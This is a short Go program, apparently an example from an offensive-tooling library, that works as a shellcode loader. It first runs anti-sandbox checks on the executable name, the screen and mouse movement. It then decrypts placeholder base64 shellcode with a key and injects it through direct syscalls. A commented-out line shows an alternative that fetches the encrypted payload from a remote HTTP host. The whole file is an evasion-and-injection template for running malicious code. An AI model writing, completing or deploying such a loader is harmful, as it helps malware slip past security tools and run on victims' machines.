package main

import (
	"github.com/MrTuxx/OffensiveGolang/pkg/evasion"
	syscall_inject "github.com/MrTuxx/OffensiveGolang/pkg/payloads/injections/syscall"
)

func main() {

	evasion.CheckNameEXE("main.exe")
	evasion.CheckScreen()
	evasion.CheckMouse(5)

	enc_string := "<SHELLCODE ENCRYPTED AND BASE64-ENCODED>"
	key := "<KEY BASE64-ENCODED>"
	//enc_string := exfil.GetData("http://192.168.0.19:8080/data.txt")
	syscall_inject.ShellCodeSyscall(enc_string, key)
}
